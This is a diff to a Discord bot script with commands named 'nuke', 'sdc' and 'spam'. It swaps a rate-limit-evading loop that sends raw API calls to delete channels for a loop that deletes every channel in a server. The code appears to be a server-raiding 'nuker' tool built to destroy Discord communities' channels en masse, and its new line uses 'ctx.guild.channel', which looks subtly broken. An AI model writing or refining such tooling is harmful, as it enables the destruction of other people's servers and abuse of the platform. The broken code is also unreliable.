@@ -108,14 +108,8 @@ async def sdr(ctx):
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild.id
-    def channel_delete(u):
-      while True:
-        r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
-        if 'retry_after' in r.text:
-            time.sleep(r.json()['retry_after'])
-            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
-        else:
-          break
+    for channel in list(ctx.guild.channel):
+        await channel.delete()
     def cc(i):
         json = {
           "name": i
@@ -139,14 +133,8 @@ async def nuke(ctx):
 
 @bot.command()
 async def sdc(ctx):
-    def channel_delete(u):
-      while True:
-        r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
-        if 'retry_after' in r.text:
-            time.sleep(r.json()['retry_after'])
-            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
-        else:
-          break
+    for channel in list(ctx.guild.channel):
+        await channel.delete()
 
 @bot.command()
 async def spam(ctx):
